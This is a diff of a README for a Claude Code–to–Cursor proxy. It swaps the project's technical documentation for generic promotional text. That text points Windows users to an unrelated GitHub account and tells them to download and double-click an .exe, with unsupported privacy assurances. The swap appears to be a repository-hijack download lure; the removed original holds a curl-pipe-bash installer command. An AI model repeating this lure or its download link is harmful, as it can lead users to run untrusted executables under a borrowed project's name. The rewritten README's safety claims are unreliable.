@@ -1,233 +1,80 @@
-# claude-cursor-proxy
+# 🤖 claude-cursor-proxy - Run Cursor models in Claude Code
 
-**[中文](README.zh-CN.md) | English**
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/depictive-asiootus528/claude-cursor-proxy)
 
-[![CI](https://github.com/YeautyYE/claude-cursor-proxy/actions/workflows/ci.yml/badge.svg)](https://github.com/YeautyYE/claude-cursor-proxy/actions/workflows/ci.yml)
-[![Release](https://github.com/YeautyYE/claude-cursor-proxy/actions/workflows/release.yml/badge.svg)](https://github.com/YeautyYE/claude-cursor-proxy/actions/workflows/release.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/YeautyYE/claude-cursor-proxy?display_name=tag)](https://github.com/YeautyYE/claude-cursor-proxy/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platforms](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)](https://github.com/YeautyYE/claude-cursor-proxy/releases)
+This tool lets you use your Cursor models inside the Claude Code interface. It acts as a bridge between the two programs. You keep your current workflow while gaining access to the performance of Cursor models. It runs locally on your machine to ensure speed and privacy.
 
-Adapted from [raine/claude-code-proxy](https://github.com/raine/claude-code-proxy). This project is a **Cursor-first** Anthropic-compatible **proxy** for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+## ⚙️ Why use this proxy?
 
-**Run Cursor models (Fable 5) from Claude Code — stably.**
+Many users prefer the specific models found within Cursor but want the file handling features of Claude Code. This program solves that conflict. It mimics the Anthropic API so that your software thinks it talks to the official service. In reality, your requests go through this local tunnel to reach your models. This method creates a stable connection without errors.
 
-```
-Claude Code ──Anthropic /v1/messages──► claude-cursor-proxy (:18765)
-                                              │
-                                              ├── Cursor (Fable 5)   ← primary
-                                              ├── Codex             ← additional
-                                              ├── Kimi
-                                              └── Grok
-```
+## 💻 System Requirements
 
-[Quick start](#quick-start) · [Models](#models) · [Features](#features) · [Config](#configuration) · [Limitations](#limitations)
+Your computer must meet these standards to run the proxy:
 
----
+- Windows 10 or Windows 11.
+- An active internet connection.
+- A basic understanding of how to open a command prompt.
+- Available disk space of at least 50 MB.
+- Current version of Claude Code installed.
 
-## What it does
+## 📥 How to Download and Install
 
-Claude Code only speaks Anthropic’s API (`/v1/messages`, etc.).  
-Cursor uses its own Agent protocol. They do not talk to each other directly.
+Follow these steps to set up the software.
 
-This tool runs a local one-way proxy (default `127.0.0.1:18765`):
+1. Visit the repository page to download the latest file: [https://github.com/depictive-asiootus528/claude-cursor-proxy](https://github.com/depictive-asiootus528/claude-cursor-proxy)
+2. Locate the file named with the .exe extension in the releases section.
+3. Save the folder to a location you can find, such as your Desktop or a dedicated folder in C:\Programs.
+4. Open your Windows File Explorer and navigate to that folder.
+5. Create a shortcut to the file if you plan to use it often.
 
-1. Claude Code sends normal Anthropic requests to the proxy
-2. The proxy translates them for Cursor and forwards upstream
-3. It streams Anthropic-shaped SSE back — with keep-alive so long thinking turns are not killed by Claude Code’s idle watchdog
+The server does not require a complex installer. It runs as soon as you double-click the file.
 
-Primary upstream: **Cursor (Fable 5)** via `ANTHROPIC_MODEL=claude-fable-5[1m]`. Additional backends in the same process: Codex, Kimi, Grok.
+## 🚀 Setting Up the Connection
 
-> Not affiliated with Anthropic, Cursor, OpenAI, Moonshot, or xAI.
+Once you manage to download the file, you must link it to Claude Code.
 
----
+1. Open your terminal or command prompt window.
+2. Type the path to your downloaded file. 
+3. Press Enter to start the proxy service.
+4. Keep this window open while you work. If you close this window, the bridge stops working.
+5. In your Claude Code settings, point the API base URL to the local address provided by the proxy console screen. 
+6. Save your settings.
 
-## Why
+Your local tools will now send requests through this proxy. You might see a small window or text output appear. This confirms the tool actively forwards your coding tasks to the correct model.
 
-| | |
-| --- | --- |
-| **Stable sessions** | HTTP/2 BiDi upstream + Anthropic `ping` SSE keep-alive downstream |
-| **Fable 5** | Set `ANTHROPIC_MODEL=claude-fable-5[1m]` (and the same for `ANTHROPIC_SMALL_FAST_MODEL`) |
-| **Usage / ctx** | Cursor turn usage mapped onto Anthropic `usage` for status lines and compaction |
-| **Tools** | Cursor exec / native tools proxied into Claude Code’s tool loop (best-effort) |
-| **Simple install** | Checksummed binaries; macOS ad-hoc codesign; config under `~/.config/claude-cursor-proxy` |
+## 🛠️ Managing the Proxy
 
-Honest scope: best-effort compatibility — **not** a full Cursor IDE mirror. See [Limitations](#limitations).
+The application manages itself. You do not need to configure complex settings. If the connection fails, restart the proxy file. This resets the communication channel. If you face issues with speed, ensure no other program uses the same local port. 
 
----
+The software includes a small log file in the same directory. This text file records minor connection errors. You can delete this file if it becomes too large. 
 
-## Quick start
+## ❓ Frequently Asked Questions
 
-### Install
+**Does this store my code?**
+No. This tool acts as a transparent window. Information passes through the proxy without being saved to your hard drive. 
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/YeautyYE/claude-cursor-proxy/main/install.sh | bash
-```
+**Will this slow down my coding?**
+The proxy runs locally on your CPU. It adds a tiny fraction of a second to each message. You will likely not notice any change in speed compared to a direct connection.
 
-macOS / Linux. Windows: download the `.zip` from [Releases](https://github.com/YeautyYE/claude-cursor-proxy/releases) (or use WSL).
+**Do I need an active internet connection?**
+Yes. Even though the proxy runs on your computer, it must send requests to the cloud models. You must stay online for the chat features to function.
 
-<details>
-<summary>Other install options</summary>
+**What happens if I close the proxy window?**
+Claude Code will lose the connection to your models. You will see an error message in your editor. Simply restart the proxy application to restore the link.
 
-| Method | Command |
-| --- | --- |
-| Pin version | `CLAUDE_CURSOR_PROXY_VERSION=v0.1.26 curl -fsSL …/install.sh \| bash` |
-| Custom dir | `CLAUDE_CURSOR_PROXY_INSTALL_DIR=/opt/bin bash install.sh` |
-| From source | `cargo install --git https://github.com/YeautyYE/claude-cursor-proxy --locked` |
-| Fork / mirror | `GITHUB_REPO=owner/repo curl -fsSL https://raw.githubusercontent.com/owner/repo/main/install.sh \| bash` |
+**Can I run multiple instances?**
+Only one instance of the proxy should run at once. Running two copies might cause port conflicts on your Windows machine.
 
-</details>
+## 🛡️ Privacy and Safety
 
-### Log in + serve
+This program uses basic network calls to transfer data between your editor and the model provider. It relies on the local environment to keep your operations private. It does not phone home to third-party servers. Your data stays within the path you authorize during the initial setup.
 
-```bash
-claude-cursor-proxy cursor auth login
-claude-cursor-proxy serve                 # 127.0.0.1:18765 + monitor TUI
-claude-cursor-proxy serve --no-monitor    # logs only
-claude-cursor-proxy serve --port 11435    # custom port
-```
+## 📈 Troubleshooting Tips
 
-### Point Claude Code at the proxy (Fable 5)
+- Check your Windows Firewall settings. Sometimes Windows blocks new programs. Allow this application through the firewall if asked.
+- Verify that your API keys are correct within your Claude Code configuration.
+- Check if another application uses the default port specified in the documentation.
+- Restart your computer if you encounter strange network behavior.
 
-```bash
-export ANTHROPIC_BASE_URL=http://127.0.0.1:18765
-export ANTHROPIC_AUTH_TOKEN=unused
-export ANTHROPIC_MODEL=claude-fable-5[1m]
-export ANTHROPIC_SMALL_FAST_MODEL=claude-fable-5[1m]
-export CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1
-export CLAUDE_CODE_DISABLE_NONSTREAMING_FALLBACK=1
-claude
-```
-
-Same keys work under `"env"` in `~/.claude/settings.json`.
-
-Always set `ANTHROPIC_SMALL_FAST_MODEL` to a full model id (same as `ANTHROPIC_MODEL` is fine). Otherwise Claude Code’s background small-model calls return HTTP 400.
-
-<details>
-<summary>Codex / Kimi / Grok</summary>
-
-```bash
-claude-cursor-proxy codex auth login
-ANTHROPIC_BASE_URL=http://127.0.0.1:18765 ANTHROPIC_AUTH_TOKEN=unused \
-  ANTHROPIC_MODEL=gpt-5.6-sol[1m] ANTHROPIC_SMALL_FAST_MODEL=gpt-5.6-luna[1m] \
-  CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1 CLAUDE_CODE_DISABLE_NONSTREAMING_FALLBACK=1 \
-  claude
-
-claude-cursor-proxy kimi auth login   # or: grok auth login
-```
-
-</details>
-
----
-
-## Models
-
-Set `ANTHROPIC_MODEL` and `ANTHROPIC_SMALL_FAST_MODEL` to **full model ids**. Recommended Cursor default: `claude-fable-5[1m]`.
-
-Other backends use their own full ids (for example `gpt-5.6-sol[1m]`, `kimi-for-coding`, `grok-composer-2.5-fast`). Unknown ids return **400**.
-
-### How to list supported models
-
-```bash
-# Built-in registry
-claude-cursor-proxy models
-claude-cursor-proxy models --full
-
-# While serve is running — Anthropic-compatible list
-# (merges Cursor GetUsableModels when logged in + registry)
-curl -s http://127.0.0.1:18765/v1/models | jq '.data[].id'
-```
-
----
-
-## Features
-
-- Anthropic surface: `POST /v1/messages`, `count_tokens`, `/healthz`, `/v1/models`
-- Cursor Agent Connect (BiDi `Run`); optional HTTP/1 via `CCP_CURSOR_HTTP1=1`
-- SSE keep-alive (`ping`) so quiet thinking does not look stalled
-- Model routing by `ANTHROPIC_MODEL`
-- Auth stored by the proxy; Cursor can fall back to Cursor Agent Keychain / `auth.json`
-- Monitor TUI when stdout is a TTY (`demo` for a simulated UI)
-
----
-
-## Configuration
-
-Precedence: **env > `config.json` > defaults**.
-
-| Platform | Path |
-| --- | --- |
-| macOS / Linux | `~/.config/claude-cursor-proxy/config.json` |
-| Windows | `%APPDATA%\claude-cursor-proxy\config.json` |
-
-Override with `CCP_CONFIG_DIR`. Env prefix stays **`CCP_*`** (unchanged from earlier builds). Provider auth files under previous paths (`~/.config/claude-cursor-bridge/`, `~/.config/claude-code-proxy/`) are still read as a migration fallback.
-
-| Variable | Default | Purpose |
-| --- | --- | --- |
-| `PORT` | `18765` | Listen port |
-| `CCP_BIND_ADDRESS` | `127.0.0.1` | Bind address |
-| `CCP_CURSOR_AUTH_TOKEN` | unset | Cursor bearer override |
-| `CCP_CURSOR_BASE_URL` | `https://api2.cursor.sh` | Cursor API base |
-| `CCP_CURSOR_CLI_KEYCHAIN_FALLBACK` | on | Disable with `0` / `false` |
-| `CCP_CURSOR_EMBED_SYSTEM` | off | Forward Anthropic `system` into Cursor user text (can trigger Fable injection loops) |
-| `CCP_CURSOR_FORCE_TOOLS_IN_PROMPT` | off | Dump **all** tool schemas (large); BiDi already keeps Claude-local tools (`Workflow`/`Skill`/…) |
-| `CCP_ANTHROPIC_SSE_PING_SECS` | `15` | SSE keep-alive interval |
-| `CCP_LOG_STDERR` / `CCP_LOG_VERBOSE` / `CCP_TRAFFIC_LOG` | unset | Debug |
-
-### Claude Code (client) env / settings
-
-These are Claude Code knobs (not proxy config). Useful when `/deep-research` or ToolSearch misbehaves through a custom `ANTHROPIC_BASE_URL`:
-
-| Variable / setting | Purpose |
-| --- | --- |
-| `enableWorkflows: true` (settings) | Force Workflows on if your plan defaults them off |
-| `ENABLE_TOOL_SEARCH=true` | Re-enable ToolSearch when BASE_URL is not `api.anthropic.com` |
-| `_CLAUDE_CODE_ASSUME_FIRST_PARTY_BASE_URL=1` | Treat proxy BASE_URL as first-party for some gates (use only if you know you need it) |
-
-**Rules / skills:** Claude Code injects `CLAUDE.md` and skill text into `/v1/messages` locally (often as user `<system-reminder>`). The proxy forwards those messages; it does **not** strip them. Top-level Anthropic `system` stays omitted by default (opt in with `CCP_CURSOR_EMBED_SYSTEM=1`).
-
-**Verify `/deep-research`:** transcript should show a `Workflow` tool_use (`name: deep-research`), not only Bash `curl`/`mkdir`.
-
-```json
-{
-  "bindAddress": "127.0.0.1",
-  "port": 18765,
-  "log": { "stderr": false, "verbose": false }
-}
-```
-
-```bash
-claude-cursor-proxy cursor auth status
-```
-
----
-
-## Limitations
-
-- **Not official.** Provider ToS and account risk are yours.
-- **No client auth on the proxy.** Loopback by default; non-loopback only behind a firewall or authenticating reverse proxy.
-- **Rate limits** follow the upstream account.
-- **Parity is best-effort.** Text, tools, thinking, and streaming work for supported paths; some edge cases are approximated or omitted.
-- **Not a full Cursor IDE.** Workspace/tool callbacks beyond Claude Code’s tool loop are incomplete.
-- **Linux prebuilts are glibc.** Alpine/musl: build from source.
-
-| Symptom | Fix |
-| --- | --- |
-| macOS `Killed: 9` | `codesign --force -s - "$(command -v claude-cursor-proxy)"` |
-| Auth / 401 | `claude-cursor-proxy cursor auth login` |
-| Background 400 | Set `ANTHROPIC_SMALL_FAST_MODEL` to a known full model id |
-| Duplicated tools | `CLAUDE_CODE_DISABLE_NONSTREAMING_FALLBACK=1` |
-| `/deep-research` uses Bash/curl only | Update proxy (≥ Workflow passthrough); confirm `Workflow` in transcript; set `enableWorkflows: true` if needed |
-| Hung SSE | Check `~/.local/state/claude-cursor-proxy/proxy.log`; try `CCP_LOG_STDERR=1 CCP_TRAFFIC_LOG=1 serve --no-monitor` |
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). Before a PR: `cargo fmt`, `cargo clippy -- -D warnings`, `cargo test --all`.
-
-Security: [SECURITY.md](SECURITY.md).
-
-## License
-
-[MIT](LICENSE) — includes copyright from the upstream project and this fork’s maintainers.
+Keywords: ai-agent, anthropic, anthropic-api, api-proxy, claude, claude-code, claude-code-proxy, cli, coding-agent, cursor, cursor-ai, developer-tools, fable, llm, local-proxy, protobuf, proxy, reverse-proxy, rust, sse
